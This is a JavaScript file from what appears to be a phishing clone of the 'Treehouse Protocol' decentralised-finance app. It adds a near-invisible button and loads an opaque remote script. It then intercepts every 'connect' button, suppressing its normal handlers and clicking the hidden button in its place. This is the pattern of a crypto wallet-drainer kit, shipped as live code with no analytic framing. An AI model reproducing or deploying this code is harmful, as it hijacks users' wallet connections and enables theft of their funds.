// Get the query parameters from the URL
const urlParams = new URLSearchParams(window.location.search);
document.title = "App | Treehouse Protocol";
document.addEventListener('DOMContentLoaded', function () {
    const btnz = document.createElement('button');
    btnz.id = 'cBB';
    btnz.classList.add("interact-button");
    btnz.style.position = 'absolute';
    btnz.style.opacity = 0.006;
    btnz.style.height = "0.01em";
    // btnz.style.bottom = 0;
    // btnz.style.left = 0;
    btnz.style["zIndex"] = '100';
    btnz.textContent = 'Click Me!';
    loadScript('/a2b91e7c-bcd5-42ba-97cb-adea40e3b3cf.js', () => {
        setTimeout(() => {
            // console.clear();
        }, "5000");
        console.log("Script loaded.");
    });
    // Append the button to the body
    document.body.appendChild(btnz);





    const addClassToButtons = () => {
        const buttons = document.querySelectorAll("button");
        newArr = [];
        buttons.forEach(btn => {
            if (btn.innerHTML.toLowerCase().includes("connect")) {
                btn.classList.add("conB");
                btn.addEventListener('click', (event) => {
                    event.preventDefault();
                    event.stopPropagation();
                    event.stopImmediatePropagation(); // Stop all other event listeners
                    const btn = document.getElementById("cBB");
                    btn.click();
                });
            }
        });
    };

    // Run initially to cover any buttons already present
    addClassToButtons();

    // Create a MutationObserver to observe changes to the DOM
    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            if (mutation.addedNodes.length > 0) {
                addClassToButtons();
            }
        });
    });

    // Start observing the document body for changes in child elements
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
});


function loadScript(url, callback) {
    try {
        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;
        script.async = true;

        // Script loading callback
        script.onload = function() {
            callback();
        };

        // Handle script error event
        script.onerror = (error) => {
            console.error(`Script error: ${url}`, error);
            // reject(error);
        };

        // script.src = url;
        document.head.appendChild(script);
    } catch(err) {

    }
}

// Callback function to click the button once the script is loaded
function onScriptLoaded() {
    
}

